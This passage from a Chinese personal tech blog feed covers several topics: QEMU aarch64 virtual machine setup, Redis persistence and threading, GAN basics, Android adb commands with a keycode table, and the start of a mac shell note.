<h3 id="1-2-下载最新archlinux的iso镜像"><a href="#1-2-下载最新archlinux的iso镜像" class="headerlink" title="1.2. 下载最新archlinux的iso镜像"></a>1.2. 下载最新archlinux的iso镜像</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://mirror.tuna.tsinghua.edu.cn/archlinuxarm/os/ArchLinuxARM-aarch64-latest.tar.gz</span><br></pre></td></tr></table></figure>

<h3 id="1-3-启动虚拟机"><a href="#1-3-启动虚拟机" class="headerlink" title="1.3. 启动虚拟机"></a>1.3. 启动虚拟机</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-system-aarch64 \</span><br><span class="line">    -m 2048 \</span><br><span class="line">    -cpu host \</span><br><span class="line">    -smp 2 \</span><br><span class="line">    -bios QEMU_EFI.fd \</span><br><span class="line">    -nographic \</span><br><span class="line">    -drive if=none,file=ubuntu-16.04.3-server-arm64.iso,id=cdrom,media=cdrom \</span><br><span class="line">    -device virtio-scsi-device \</span><br><span class="line">    -device scsi-cd,drive=cdrom \</span><br><span class="line">    -drive if=none,file=archlinux-aarch64.img,id=hd0 \</span><br><span class="line">    -device virtio-blk-device,drive=hd0</span><br><span class="line"></span><br><span class="line">qemu-system-aarch64 \</span><br><span class="line">    -M virt \</span><br><span class="line">    -cpu cortex-a57 \</span><br><span class="line">    -kernel archlinux-aarch64/boot/Image \</span><br><span class="line">    -initrd archlinux-aarch64/boot/initramfs-linux.img \</span><br><span class="line">    -nographic</span><br><span class="line">    # -M virt \</span><br></pre></td></tr></table></figure>

<h4 id="1-选项解释"><a href="#1-选项解释" class="headerlink" title="(1) 选项解释"></a>(1) 选项解释</h4><ul>
<li><code>-m 2048</code>: 使用2048M的内存</li>
<li><code>-cpu host</code>: 使用宿主机类型的cpu，完全使用宿主机的特性</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用下面命令可以查看支持的cpu类型</span></span><br><span class="line">=&gt; qemu-system-aarch64 -cpu help</span><br><span class="line">Available CPUs:</span><br><span class="line">  a64fx</span><br><span class="line">  arm1026</span><br><span class="line">  arm1136</span><br><span class="line">  arm1136-r2</span><br><span class="line">  arm1176</span><br><span class="line">  arm11mpcore</span><br><span class="line">  arm926</span><br><span class="line">  arm946</span><br><span class="line">  cortex-a15</span><br><span class="line">  cortex-a53</span><br><span class="line">  cortex-a57</span><br><span class="line">  cortex-a7</span><br><span class="line">  cortex-a72</span><br><span class="line">  cortex-a8</span><br><span class="line">  cortex-a9</span><br><span class="line">  cortex-m0</span><br><span class="line">  cortex-m3</span><br><span class="line">  cortex-m33</span><br><span class="line">  cortex-m4</span><br><span class="line">  cortex-m55</span><br><span class="line">  cortex-m7</span><br><span class="line">  cortex-r5</span><br><span class="line">  cortex-r5f</span><br><span class="line">  host</span><br><span class="line">  max</span><br><span class="line">  pxa250</span><br><span class="line">  pxa255</span><br><span class="line">  pxa260</span><br><span class="line">  pxa261</span><br><span class="line">  pxa262</span><br><span class="line">  pxa270-a0</span><br><span class="line">  pxa270-a1</span><br><span class="line">  pxa270</span><br><span class="line">  pxa270-b0</span><br><span class="line">  pxa270-b1</span><br><span class="line">  pxa270-c0</span><br><span class="line">  pxa270-c5</span><br><span class="line">  sa1100</span><br><span class="line">  sa1110</span><br><span class="line">  ti925t</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-smp 2</code>:  设置客户机总共有2个逻辑CPU，并设置了其中CPU socket的数量、每个socket上核心（core）的数量、每个核心上的线程（thread）数量。其中:</li>
</ul>
<p>$$<br>n &#x3D; sockets \times cores \times threads<br>$$</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; qemu-system-aarch64 -smp help</span><br><span class="line">smp-opts options:</span><br><span class="line">  cores=&lt;num&gt;</span><br><span class="line">  cpus=&lt;num&gt;</span><br><span class="line">  dies=&lt;num&gt;</span><br><span class="line">  maxcpus=&lt;num&gt;</span><br><span class="line">  sockets=&lt;num&gt;</span><br><span class="line">  threads=&lt;num&gt;</span><br></pre></td></tr></table></figure>

<!-- - `-M virt`: -->

<ul>
<li><code>-hda</code>、<code>-hdb</code>和<code>-cdrom</code>: 设置客户机的 IDE 磁盘和光盘设备。如 <code>-hda centos7.img</code> 将 <code>centos7.img</code> 镜像文件作为客户机的第一个 IDE 磁盘。</li>
<li><code>-drive</code>: 详细的配置一个驱动。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 virtio_blk 驱动 和 磁盘回写机制 来支持该磁盘文件</span></span><br><span class="line">-drive file=/images/centos7.img,if=virtio,cache=writeback</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-boot</code>: 设置客户机启动的各种选项（包括启动顺序等），如：在安装客户机操作系统时，使用 <code>-boot order=dc -hda centos7.img -cdrom centos7.iso</code>，让 <code>centos.img</code> 文件作为IDE磁盘，安装光盘 <code>centos7.iso</code> 作为 IDE 光驱，并且从光盘启动客户机，从而让客户机进入到系统安装的流程中。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-boot [order=drives][,once=drives][,menu=on|off]</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>redis集群缓存数据库</title>
    <url>/blogs/2022-01-20-redis/</url>
    <content><![CDATA[<h1 id="一、命令详解"><a href="#一、命令详解" class="headerlink" title="一、命令详解"></a>一、命令详解</h1><h1 id="二、配置解析"><a href="#二、配置解析" class="headerlink" title="二、配置解析"></a>二、配置解析</h1><h2 id="1-aof持久化"><a href="#1-aof持久化" class="headerlink" title="1. aof持久化"></a>1. aof持久化</h2><ul>
<li>aof储存的是redis的命令集，是恢复当前redis状态的命令</li>
<li>1s写入一次，丢失只有1s的指令丢失</li>
<li>随时间推移会越来越大，超过一定大小会进行优化，优化成当前状态的最小指令集</li>
<li>新版redis变成使用当前内存镜像和日志结合的方式进行备份</li>
</ul>
<h1 id="三、使用的几种思想"><a href="#三、使用的几种思想" class="headerlink" title="三、使用的几种思想"></a>三、使用的几种思想</h1><h2 id="1-持久化考虑"><a href="#1-持久化考虑" class="headerlink" title="1. 持久化考虑"></a>1. 持久化考虑</h2><ul>
<li>一般redis使用是作为缓存使用，并不作为持久化数据储存使用</li>
<li>使用持久化尽量考虑不要影响系统性能，影响系统性能就可能还不如使用mysql</li>
<li>尽量考虑缓存为重启可恢复，如果使用持久化就要考虑重启丢失部分数据的可能</li>
</ul>
<h2 id="2-高性能和可靠性"><a href="#2-高性能和可靠性" class="headerlink" title="2. 高性能和可靠性"></a>2. 高性能和可靠性</h2><ul>
<li>两者不可兼得，追求高性能就不可能同时保证完全可靠</li>
<li>完全追求可靠，会导致redis的性能可能还会低于mysql</li>
</ul>
<h2 id="3-一致性和可用性"><a href="#3-一致性和可用性" class="headerlink" title="3. 一致性和可用性"></a>3. 一致性和可用性</h2><ul>
<li>强一致性: 集群保证每个节点数据一致，但是性能很低</li>
<li>弱一致性（默认）: 可能丢数据</li>
<li>最终一致性: 存在一个强一致性黑盒，每个redis和此黑盒同步，如果redis挂掉，重启后从黑盒同步</li>
</ul>
<h2 id="4-分布式锁"><a href="#4-分布式锁" class="headerlink" title="4. 分布式锁"></a>4. 分布式锁</h2><ul>
<li>对数据一致性要求高，不可以使用redis做分布式锁，因为不可靠，如金融</li>
<li>对数据一致性要求不高，对处理速度要求更高，可以使用，如互联网非金融业务</li>
</ul>
<h1 id="四、源码解析"><a href="#四、源码解析" class="headerlink" title="四、源码解析"></a>四、源码解析</h1><h2 id="1-线程模型"><a href="#1-线程模型" class="headerlink" title="1. 线程模型"></a>1. 线程模型</h2><p>参考自<a href="https://zhuanlan.zhihu.com/p/356059845">Redis 多线程网络模型全面揭秘</a></p>
<h3 id="老版本单线程io"><a href="#老版本单线程io" class="headerlink" title="老版本单线程io"></a>老版本单线程io</h3><ul>
<li>官方解释为什么是单线程</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对于一个 DB 来说，CPU 通常不会是瓶颈，因为大多数请求不会是 CPU 密集型的，而是 I/O 密集型。具体到 Redis 的话，如果不考虑 RDB/AOF 等持久化方案，Redis 是完全的纯内存操作，执行速度是非常快的，因此这部分操作通常不会是性能瓶颈，Redis 真正的性能瓶颈在于网络 I/O，也就是客户端和服务端之间的网络传输延迟，因此 Redis 选择了单线程的 I/O 多路复用来实现它的核心网络模型。</span><br></pre></td></tr></table></figure>

<ul>
<li>单线程模型，使用linux下的epoll实现多路复用的模式，实现不阻塞的高性能需求</li>
<li>每个读取和计算都在单个线程执行，防止很多hashmap的多线程不安全的操作</li>
</ul>
<h3 id="v6-0新版本多线程io，需要配置开启"><a href="#v6-0新版本多线程io，需要配置开启" class="headerlink" title="v6.0新版本多线程io，需要配置开启"></a>v6.0新版本多线程io，需要配置开启</h3><p>单线程可以完成各种操作，为什么还要引入多线程。由于redis的性能瓶颈其实只是在网络的收发上面，并不是在数据库的操作上面。</p>
<p>redis将网络的收发分到了多线程上面去，而数据库的读写计算还是在单线程上。大致逻辑如下:</p>
<ol>
<li>epoll的io模型不变，主线程读取待接收的fd，分发到各个io线程进行读取，主线程进行等待</li>
<li>等待io线程读取完成，主线程再操作所有的io线程里面读完的数据，执行数据库的读写，这一步是单线程</li>
<li>读取数据操作完成，将要写的数据再次分发到各个io线程进行写回</li>
<li>主线程等待io线程写操作完成后，在重新回到1进行</li>
</ol>
]]></content>
      <categories>
        <category>Program</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>后台开发</tag>
      </tags>
  </entry>
  <entry>
    <title>GAN网络学习</title>
    <url>/blogs/2022-01-03-gan/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本博客是对GAN网络学习的记录</p>
<h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="1-基础概念"><a href="#1-基础概念" class="headerlink" title="1. 基础概念"></a>1. 基础概念</h2><ul>
<li>由生成器G和判别器D组成</li>
<li>首先固定G，训练判别器D，然后反过来，达到博弈的情况</li>
<li>判别器D的职责，判断生成器G的数据是否为真</li>
<li>生成器G的职责，骗过判别器D，生成的数据让判别器无法识别</li>
<li>最终效果是判别器对生成器生成的数据判别概率为50%</li>
</ul>
<h2 id="2-GAN训练难题"><a href="#2-GAN训练难题" class="headerlink" title="2. GAN训练难题"></a>2. GAN训练难题</h2><ul>
<li>如果G生成的数据和真实数据没有overlap（重叠），判别器对于任意生成的反馈都是无穷大</li>
<li>导致无法对G进行有效反馈，G无法收敛</li>
</ul>
<p><strong>WGAN解决方案</strong></p>
<ul>
<li>假设生成的数据是随机数图片，将图片转成真实图片走了多少步，将最少步数作为反馈</li>
<li>这样可以让梯度向真实情况逼近</li>
<li>类似于搬砖，将一堆砖块经历多少步可以转换和另一堆一致（earth move distance）</li>
</ul>
<h2 id="3-CircleGAN"><a href="#3-CircleGAN" class="headerlink" title="3. CircleGAN"></a>3. CircleGAN</h2><ul>
<li>假设需要将斑马转化成普通马，判别器D用于判断是否为普通马</li>
<li>如果G偷懒，生成任意一张马的图片，同样可以骗过D</li>
<li>需要将G生成的图片经过某种转换可以还原成原始斑马图片，可以有效防止此情况发生</li>
</ul>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>Android相关笔记</title>
    <url>/blogs/2021-12-26-android/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录Android研究的一些笔记，并非java相关，而是使用<code>linux deploy</code>在Android手机上启用linux相关的笔记</p>
<h1 id="一、基本知识"><a href="#一、基本知识" class="headerlink" title="一、基本知识"></a>一、基本知识</h1><h2 id="1-底层库的位置"><a href="#1-底层库的位置" class="headerlink" title="1. 底层库的位置"></a>1. 底层库的位置</h2><h3 id="1-1-gpu调用库"><a href="#1-1-gpu调用库" class="headerlink" title="1.1. gpu调用库"></a>1.1. gpu调用库</h3><p><strong>高通 adreno</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">算是android中的egl库，用来加载具体的实现</span></span><br><span class="line">/system/lib/libEGL.so</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">opengl具体实现的wrapper</span></span><br><span class="line">/system/lib/libGLESv1_CM.so</span><br><span class="line">/system/lib/libGLESv2.so</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">opengl软件实现，即agl</span></span><br><span class="line">/system/lib/egl/libGLES_android.so</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">egl的实现</span></span><br><span class="line">/vendor/lib/egl/libEGL_adreno.so</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">opengl硬件实现</span></span><br><span class="line">/vendor/lib/egl/libGLESv1_CM_adreno.so</span><br><span class="line">/vendor/lib/egl/libGLESv2_adreno.so</span><br></pre></td></tr></table></figure>

<h2 id="2-开发硬件相关"><a href="#2-开发硬件相关" class="headerlink" title="2. 开发硬件相关"></a>2. 开发硬件相关</h2><h3 id="2-1-摄像头"><a href="#2-1-摄像头" class="headerlink" title="2.1. 摄像头"></a>2.1. 摄像头</h3><ul>
<li>根据网上查找的了解到，无法直接通过<code>/dev/videox</code>来使用摄像头，具体原因就不清楚了，需要使用ndk提供的接口</li>
</ul>
<h1 id="二、资源"><a href="#二、资源" class="headerlink" title="二、资源"></a>二、资源</h1><h2 id="1-apk集合网站"><a href="#1-apk集合网站" class="headerlink" title="1. apk集合网站"></a>1. apk集合网站</h2><p><a href="http://www.apkmirror.com/">http://www.apkmirror.com/</a></p>
<h1 id="三、adb命令"><a href="#三、adb命令" class="headerlink" title="三、adb命令"></a>三、adb命令</h1><h2 id="1-文件传输"><a href="#1-文件传输" class="headerlink" title="1. 文件传输"></a>1. 文件传输</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb pull /sdcard/test.txt ./</span><br><span class="line">adb push test.txt /sdcard</span><br></pre></td></tr></table></figure>

<h2 id="2-端口转发"><a href="#2-端口转发" class="headerlink" title="2. 端口转发"></a>2. 端口转发</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将本地8888端口的数据转发到手机的22端口上</span></span><br><span class="line">=&gt; adb forward tcp:8888 tcp:22</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前转发列表</span></span><br><span class="line">=&gt; adb forward --list</span><br><span class="line">3e329821 tcp:8888 tcp:22</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除转发</span></span><br><span class="line">=&gt; adb forward --remove tcp:8888</span><br></pre></td></tr></table></figure>

<h2 id="3-执行shell命令"><a href="#3-执行shell命令" class="headerlink" title="3. 执行shell命令"></a>3. 执行shell命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; adb shell &quot;input tab 540 1080; input tab 540 1080; input tab 540 1080&quot;</span><br></pre></td></tr></table></figure>

<h3 id="3-1-常用的android命令"><a href="#3-1-常用的android命令" class="headerlink" title="3.1. 常用的android命令"></a>3.1. 常用的android命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">模拟点击事件，x从左上到右上，y从左上到左下</span></span><br><span class="line">input tap x y</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">模拟滑动事件</span></span><br><span class="line">input swipe x1 y1 x2 y2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">模拟物理按键，keycode见下文</span></span><br><span class="line">input keyevent keycode</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输入文本信息</span></span><br><span class="line">input text &#x27;abc&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">截屏</span></span><br><span class="line">screencap -p /sdcard/screen.png</span><br></pre></td></tr></table></figure>

<h4 id="1-keycode"><a href="#1-keycode" class="headerlink" title="1) keycode"></a>1) keycode</h4><h5 id="电话键"><a href="#电话键" class="headerlink" title="电话键"></a>电话键</h5><table>
<thead>
<tr>
<th>key</th>
<th>说明</th>
<th>value</th>
</tr>
</thead>
<tbody><tr>
<td>KEYCODE_CALL</td>
<td>拨号</td>
<td>5</td>
</tr>
<tr>
<td>KEYCODE_ENDCALL</td>
<td>挂机</td>
<td>6</td>
</tr>
<tr>
<td>KEYCODE_HOME</td>
<td>Home</td>
<td>3</td>
</tr>
<tr>
<td>KEYCODE_BACK</td>
<td>返回</td>
<td>4</td>
</tr>
<tr>
<td>KEYCODE_TASK</td>
<td>最近任务键</td>
<td>187</td>
</tr>
<tr>
<td>KEYCODE_VOLUME_UP</td>
<td>音量+</td>
<td>24</td>
</tr>
<tr>
<td>KEYCODE_VOLUME_DOWN</td>
<td>音量-</td>
<td>25</td>
</tr>
<tr>
<td>KEYCODE_VOLUME_MUTE</td>
<td>扬声器静音</td>
<td>164</td>
</tr>
<tr>
<td>KEYCODE_MUTE</td>
<td>话筒静音</td>
<td>91</td>
</tr>
<tr>
<td>KEYCODE_POWER</td>
<td>电源</td>
<td>26</td>
</tr>
<tr>
<td>KEYCODE_CAMERA</td>
<td>相机</td>
<td>27</td>
</tr>
<tr>
<td>KEYCODE_FOCUS</td>
<td>焦点</td>
<td>80</td>
</tr>
<tr>
<td>KEYCODE_NOTIFICATION</td>
<td>通知</td>
<td>83</td>
</tr>
</tbody></table>
<h6 id="基本输入"><a href="#基本输入" class="headerlink" title="基本输入"></a>基本输入</h6><table>
<thead>
<tr>
<th>key</th>
<th>说明</th>
<th>value</th>
</tr>
</thead>
<tbody><tr>
<td>KEYCODE_0</td>
<td>0</td>
<td>7</td>
</tr>
<tr>
<td>KEYCODE_1</td>
<td>1</td>
<td>8</td>
</tr>
<tr>
<td>KEYCODE_2</td>
<td>2</td>
<td>9</td>
</tr>
<tr>
<td>KEYCODE_3</td>
<td>3</td>
<td>10</td>
</tr>
<tr>
<td>KEYCODE_4</td>
<td>4</td>
<td>11</td>
</tr>
<tr>
<td>KEYCODE_5</td>
<td>5</td>
<td>12</td>
</tr>
<tr>
<td>KEYCODE_6</td>
<td>6</td>
<td>13</td>
</tr>
<tr>
<td>KEYCODE_7</td>
<td>7</td>
<td>14</td>
</tr>
<tr>
<td>KEYCODE_8</td>
<td>8</td>
<td>15</td>
</tr>
<tr>
<td>KEYCODE_9</td>
<td>9</td>
<td>16</td>
</tr>
<tr>
<td>KEYCODE_A</td>
<td>A</td>
<td>29</td>
</tr>
<tr>
<td>KEYCODE_B</td>
<td>B</td>
<td>30</td>
</tr>
<tr>
<td>KEYCODE_C</td>
<td>C</td>
<td>31</td>
</tr>
<tr>
<td>KEYCODE_D</td>
<td>D</td>
<td>32</td>
</tr>
<tr>
<td>KEYCODE_E</td>
<td>E</td>
<td>33</td>
</tr>
<tr>
<td>KEYCODE_F</td>
<td>F</td>
<td>34</td>
</tr>
<tr>
<td>KEYCODE_G</td>
<td>G</td>
<td>35</td>
</tr>
<tr>
<td>KEYCODE_H</td>
<td>H</td>
<td>36</td>
</tr>
<tr>
<td>KEYCODE_I</td>
<td>I</td>
<td>37</td>
</tr>
<tr>
<td>KEYCODE_J</td>
<td>J</td>
<td>38</td>
</tr>
<tr>
<td>KEYCODE_K</td>
<td>K</td>
<td>39</td>
</tr>
<tr>
<td>KEYCODE_L</td>
<td>L</td>
<td>40</td>
</tr>
<tr>
<td>KEYCODE_M</td>
<td>M</td>
<td>41</td>
</tr>
<tr>
<td>KEYCODE_N</td>
<td>N</td>
<td>42</td>
</tr>
<tr>
<td>KEYCODE_O</td>
<td>O</td>
<td>43</td>
</tr>
<tr>
<td>KEYCODE_P</td>
<td>P</td>
<td>44</td>
</tr>
<tr>
<td>KEYCODE_Q</td>
<td>Q</td>
<td>45</td>
</tr>
<tr>
<td>KEYCODE_R</td>
<td>R</td>
<td>46</td>
</tr>
<tr>
<td>KEYCODE_S</td>
<td>S</td>
<td>47</td>
</tr>
<tr>
<td>KEYCODE_T</td>
<td>T</td>
<td>48</td>
</tr>
<tr>
<td>KEYCODE_U</td>
<td>U</td>
<td>49</td>
</tr>
<tr>
<td>KEYCODE_V</td>
<td>V</td>
<td>50</td>
</tr>
<tr>
<td>KEYCODE_W</td>
<td>W</td>
<td>51</td>
</tr>
<tr>
<td>KEYCODE_X</td>
<td>X</td>
<td>52</td>
</tr>
<tr>
<td>KEYCODE_Y</td>
<td>Y</td>
<td>53</td>
</tr>
<tr>
<td>KEYCODE_Z</td>
<td>Z</td>
<td>54</td>
</tr>
<tr>
<td>KEYCODE_COMMA</td>
<td>,</td>
<td>55</td>
</tr>
<tr>
<td>KEYCODE_PERIOD</td>
<td>.</td>
<td>56</td>
</tr>
<tr>
<td>KEYCODE_GRAVE</td>
<td>&#96;</td>
<td>68</td>
</tr>
<tr>
<td>KEYCODE_MINUS</td>
<td>-</td>
<td>69</td>
</tr>
<tr>
<td>KEYCODE_EQUALS</td>
<td>&#x3D;</td>
<td>70</td>
</tr>
<tr>
<td>KEYCODE_LEFT_BRACKET</td>
<td>[</td>
<td>71</td>
</tr>
<tr>
<td>KEYCODE_RIGHT_BRACKET</td>
<td>]</td>
<td>72</td>
</tr>
<tr>
<td>KEYCODE_BACKSLASH</td>
<td>\</td>
<td>73</td>
</tr>
<tr>
<td>KEYCODE_SEMICOLON</td>
<td>;</td>
<td>74</td>
</tr>
<tr>
<td>KEYCODE_APOSTROPHE</td>
<td>‘</td>
<td>75</td>
</tr>
<tr>
<td>KEYCODE_SLASH</td>
<td>&#x2F;</td>
<td>76</td>
</tr>
<tr>
<td>KEYCODE_SPACE</td>
<td>空格</td>
<td>62</td>
</tr>
</tbody></table>
<h5 id="控制键"><a href="#控制键" class="headerlink" title="控制键"></a>控制键</h5><table>
<thead>
<tr>
<th>key</th>
<th>说明</th>
<th>value</th>
</tr>
</thead>
<tbody><tr>
<td>KEYCODE_DPAD_UP</td>
<td>导航键上</td>
<td>19</td>
</tr>
<tr>
<td>KEYCODE_DPAD_DOWN</td>
<td>导航键下</td>
<td>20</td>
</tr>
<tr>
<td>KEYCODE_DPAD_LEFT</td>
<td>导航键左</td>
<td>21</td>
</tr>
<tr>
<td>KEYCODE_DPAD_RIGHT</td>
<td>导航键右</td>
<td>22</td>
</tr>
<tr>
<td>KEYCODE_DPAD_CENTER</td>
<td>导航键中间</td>
<td>23</td>
</tr>
<tr>
<td>KEYCODE_TAB</td>
<td>Tab</td>
<td>61</td>
</tr>
<tr>
<td>KEYCODE_ENTER</td>
<td>Enter</td>
<td>66</td>
</tr>
<tr>
<td>KEYCODE_ALT_LEFT</td>
<td>Alt</td>
<td>57</td>
</tr>
<tr>
<td>KEYCODE_ALT_RIGHT</td>
<td>Alt</td>
<td>58</td>
</tr>
<tr>
<td>KEYCODE_SHIFT_LEFT</td>
<td>Shift</td>
<td>59</td>
</tr>
<tr>
<td>KEYCODE_SHIFT_RIGHT</td>
<td>Shift</td>
<td>60</td>
</tr>
<tr>
<td>KEYCODE_MOVE_HOME</td>
<td>光标到开头</td>
<td>122</td>
</tr>
<tr>
<td>KEYCODE_MOVE_END</td>
<td>光标到结尾</td>
<td>123</td>
</tr>
<tr>
<td>KEYCODE_PAGE_UP</td>
<td>向上翻页</td>
<td>92</td>
</tr>
<tr>
<td>KEYCODE_PAGE_DOWN</td>
<td>向下翻页</td>
<td>93</td>
</tr>
<tr>
<td>KEYCODE_ESCAPE</td>
<td>Esc</td>
<td>111</td>
</tr>
<tr>
<td>KEYCODE_BACKSPACE</td>
<td>Backspace</td>
<td>67</td>
</tr>
<tr>
<td>KEYCODE_FORWARD_DEL</td>
<td>Del</td>
<td>112</td>
</tr>
<tr>
<td>KEYCODE_INSERT</td>
<td>Insert</td>
<td>124</td>
</tr>
<tr>
<td>KEYCODE_NUM_LOCK</td>
<td>Num Lock</td>
<td>90</td>
</tr>
<tr>
<td>KEYCODE_CAPS_LOCK</td>
<td>Caps Lock</td>
<td>115</td>
</tr>
<tr>
<td>KEYCODE_SCROLL_LOCK</td>
<td>Scroll Lock</td>
<td>116</td>
</tr>
<tr>
<td>KEYCODE_F1</td>
<td>F1</td>
<td>131</td>
</tr>
<tr>
<td>KEYCODE_F2</td>
<td>F2</td>
<td>132</td>
</tr>
<tr>
<td>KEYCODE_F3</td>
<td>F3</td>
<td>133</td>
</tr>
<tr>
<td>KEYCODE_F4</td>
<td>F4</td>
<td>134</td>
</tr>
<tr>
<td>KEYCODE_F5</td>
<td>F5</td>
<td>135</td>
</tr>
<tr>
<td>KEYCODE_F6</td>
<td>F6</td>
<td>136</td>
</tr>
<tr>
<td>KEYCODE_F7</td>
<td>F7</td>
<td>137</td>
</tr>
<tr>
<td>KEYCODE_F8</td>
<td>F8</td>
<td>138</td>
</tr>
<tr>
<td>KEYCODE_F9</td>
<td>F9</td>
<td>139</td>
</tr>
<tr>
<td>KEYCODE_F10</td>
<td>F10</td>
<td>140</td>
</tr>
<tr>
<td>KEYCODE_F11</td>
<td>F11</td>
<td>141</td>
</tr>
<tr>
<td>KEYCODE_F12</td>
<td>F12</td>
<td>142</td>
</tr>
<tr>
<td>KEYCODE_ZOOM_IN</td>
<td>放大</td>
<td>168</td>
</tr>
<tr>
<td>KEYCODE_ZOOM_OUT</td>
<td>缩小</td>
<td>169</td>
</tr>
<tr>
<td>KEYCODE_MENU</td>
<td>菜单</td>
<td>82</td>
</tr>
<tr>
<td>KEYCODE_SEARCH</td>
<td>搜索</td>
<td>84</td>
</tr>
</tbody></table>
<h5 id="小键盘"><a href="#小键盘" class="headerlink" title="小键盘"></a>小键盘</h5><table>
<thead>
<tr>
<th>key</th>
<th>说明</th>
<th>value</th>
</tr>
</thead>
<tbody><tr>
<td>KEYCODE_NUMPAD_0</td>
<td>0</td>
<td>96</td>
</tr>
<tr>
<td>KEYCODE_NUMPAD_1</td>
<td>1</td>
<td>97</td>
</tr>
<tr>
<td>KEYCODE_NUMPAD_2</td>
<td>2</td>
<td>98</td>
</tr>
<tr>
<td>KEYCODE_NUMPAD_3</td>
<td>3</td>
<td>99</td>
</tr>
<tr>
<td>KEYCODE_NUMPAD_4</td>
<td>4</td>
<td>100</td>
</tr>
<tr>
<td>KEYCODE_NUMPAD_5</td>
<td>5</td>
<td>101</td>
</tr>
<tr>
<td>KEYCODE_NUMPAD_6</td>
<td>6</td>
<td>102</td>
</tr>
<tr>
<td>KEYCODE_NUMPAD_7</td>
<td>7</td>
<td>103</td>
</tr>
<tr>
<td>KEYCODE_NUMPAD_8</td>
<td>8</td>
<td>104</td>
</tr>
<tr>
<td>KEYCODE_NUMPAD_9</td>
<td>9</td>
<td>105</td>
</tr>
<tr>
<td>KEYCODE_NUMPAD_DIVIDE</td>
<td>&#x2F;</td>
<td>111</td>
</tr>
<tr>
<td>KEYCODE_NUMPAD_MULTIPLY</td>
<td>*</td>
<td>106</td>
</tr>
<tr>
<td>KEYCODE_NUMPAD_SUBTRACT</td>
<td>-</td>
<td>109</td>
</tr>
<tr>
<td>KEYCODE_NUMPAD_ADD</td>
<td>+</td>
<td>107</td>
</tr>
<tr>
<td>KEYCODE_NUMPAD_DOT</td>
<td>.</td>
<td>110</td>
</tr>
<tr>
<td>KEYCODE_NUMPAD_ENTER</td>
<td>Enter</td>
<td>156</td>
</tr>
</tbody></table>
<h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">KEYCODE_UNKNOWN = <span class="number">0</span></span><br><span class="line">KEYCODE_SOFT_LEFT = <span class="number">1</span></span><br><span class="line">KEYCODE_SOFT_RIGHT = <span class="number">2</span></span><br><span class="line">KEYCODE_STAR = <span class="number">17</span></span><br><span class="line">KEYCODE_POUND = <span class="number">18</span></span><br><span class="line">KEYCODE_CLEAR = <span class="number">28</span></span><br><span class="line">KEYCODE_SYM = <span class="number">63</span></span><br><span class="line">KEYCODE_EXPLORER = <span class="number">64</span></span><br><span class="line">KEYCODE_ENVELOPE = <span class="number">65</span></span><br><span class="line">KEYCODE_AT = <span class="number">77</span></span><br><span class="line">KEYCODE_NUM = <span class="number">78</span></span><br><span class="line">KEYCODE_HEADSETHOOK = <span class="number">79</span></span><br><span class="line">KEYCODE_PLUS = <span class="number">81</span></span><br><span class="line">KEYCODE_MEDIA_PLAY_PAUSE = <span class="number">85</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>mac的shell命令</title>
    <url>/blogs/2021-11-03-mac-shell/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>此文仅记录mac上和linux不同的shell命令</p>
<h1 id="一、基础操作"><a href="#一、基础操作" class="headerlink" title="一、基础操作"></a>一、基础操作</h1><h1 id="二、系统操作"><a href="#二、系统操作" class="headerlink" title="二、系统操作"></a>二、系统操作</h1><h2 id="1-查看网络"><a href="#1-查看网络" class="headerlink" title="1. 查看网络"></a>1. 查看网络</h2><h3 id="1-1-查看路由"><a href="#1-1-查看路由" class="headerlink" title="1.1. 查看路由"></a>1.1. 查看路由</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -nr</span><br></pre></td></tr></table></figure>

